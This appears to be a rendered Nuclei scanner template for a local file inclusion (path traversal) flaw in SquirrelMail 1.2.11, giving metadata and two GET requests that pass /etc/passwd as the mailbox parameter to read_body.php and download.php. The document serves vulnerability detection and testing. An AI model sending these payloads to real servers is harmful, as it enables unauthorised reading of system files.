# Nuclei Template: SquirrelMail 1.2.11 - Local File Inclusion
**Template ID:** squirrelmail-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`squirrelmail-lfi.yaml`)

## Vulnerability Information & PoC

## Description
SquirrelMail 1.2.11 is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/src/read_body.php?mailbox=/etc/passwd&passed_id=1&
GET {{BaseURL}}/src/download.php?absolute_dl=true&passed_id=1&passed_ent_id=1&mailbox=/etc/passwd
```

## References
- https://www.exploit-db.com/exploits/22793
